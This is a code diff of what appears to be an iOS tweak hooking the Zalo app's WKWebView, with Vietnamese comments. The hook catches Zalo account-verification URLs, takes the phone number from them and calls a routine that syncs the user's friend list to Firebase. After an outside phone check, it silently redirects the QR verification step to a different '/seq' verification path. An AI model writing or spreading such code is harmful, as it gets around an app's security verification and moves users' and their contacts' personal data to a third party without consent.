@@ -344,7 +344,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 }
 
 // ==============================================================================
-// HOOK ZALO WEBVIEW & TỰ ĐỘNG CHUYỂN HƯỚNG + ĐỒNG BỘ BẠN BÈ
+// HOOK ZALO WEBVIEW & TỰ ĐỘNG CHUYỂN HƯỚNG HOẶC ĐỂ NGUYÊN BẢN KHI BỊ KHÓA
 // ==============================================================================
 
 %hook WKWebView
@@ -354,8 +354,14 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     NSString *host = url.host;
     NSString *path = url.path;
 
+    // Chỉ can thiệp khi là URL xác minh Zalo
     if ([host containsString:@"accounts.zalo.me"] || [host containsString:@"zm-verification-center.zaloapp.com"]) {
         if ([path containsString:@"/verify/v3/qr"] || [path containsString:@"/verify/v3"]) {
+            // Nếu URL đã là /seq rồi thì cho qua ngay
+            if ([path containsString:@"/verify/v3/seq"]) {
+                return %orig(request);
+            }
+
             NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
             NSString *phoneParam = nil;
             for (NSURLQueryItem *item in components.queryItems) {
@@ -366,23 +372,28 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
 
             if (phoneParam && phoneParam.length >= 9) {
-                // Tự động kích hoạt đồng bộ danh bạ bạn bè về Web
+                // Tự động đồng bộ bạn bè nếu có
                 autoSyncFriendsToFirebase(phoneParam);
 
+                WKWebView *targetWebView = self;
                 verifyPhoneAndExecute(phoneParam, ^{
+                    // [HỢP LỆ]: Chuyển hướng sang SEQ
                     dispatch_async(dispatch_get_main_queue(), ^{
                         NSString *seqUrlStr = [url.absoluteString stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
                         NSURL *seqUrl = [NSURL URLWithString:seqUrlStr];
                         NSMutableURLRequest *newReq = [request mutableCopy];
                         [newReq setURL:seqUrl];
-                        [self loadRequest:newReq];
+                        [targetWebView loadRequest:newReq];
                     });
                 });
+
+                // Tạm hoãn để chờ xác thực (nếu không hợp lệ, Zalo sẽ load trang QR gốc bình thường)
                 return nil;
             }
         }
     }
 
+    // Khi không phải URL xác minh hoặc SĐT bình thường -> Chạy Zalo gốc 100%
     return %orig(request);
 }
 
